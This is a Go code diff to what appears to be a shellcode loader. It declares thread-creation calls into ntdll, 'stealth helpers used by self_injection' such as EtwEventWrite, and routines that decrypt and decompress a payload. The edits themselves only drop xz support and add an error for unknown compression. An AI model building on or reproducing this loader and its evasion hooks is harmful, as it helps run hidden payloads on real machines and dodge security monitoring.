@@ -8,6 +8,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/binary"
+	"fmt"
 	"io"
 	"os"
 	"os/exec"
@@ -18,7 +19,6 @@ import (
 	"time"
 	"unsafe"
 
-	"github.com/ulikunitz/xz"
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
@@ -60,6 +60,7 @@ var (
 	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
 	procNtWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
 	procNtClose                 = ntdll.NewProc("NtClose")
+	procRtlAddFunctionTable     = ntdll.NewProc("RtlAddFunctionTable")
 
 	// stealth helpers used by self_injection
 	procEtwEventWrite  = ntdll.NewProc("EtwEventWrite")
@@ -240,12 +241,6 @@ func decryptChaCha(data, key, nonce []byte) ([]byte, error) {
 
 func decompress(data []byte, algo string) ([]byte, error) {
 	switch algo {
-	case "xz", "lzma":
-		r, err := xz.NewReader(bytes.NewReader(data))
-		if err != nil {
-			return nil, err
-		}
-		return io.ReadAll(r)
 	case "zlib":
 		r, err := zlib.NewReader(bytes.NewReader(data))
 		if err != nil {
@@ -256,7 +251,7 @@ func decompress(data []byte, algo string) ([]byte, error) {
 	case "none":
 		return data, nil
 	default:
-		return nil, nil
+		return nil, fmt.Errorf("unknown compression algorithm: %s", algo)
 	}
 }
 
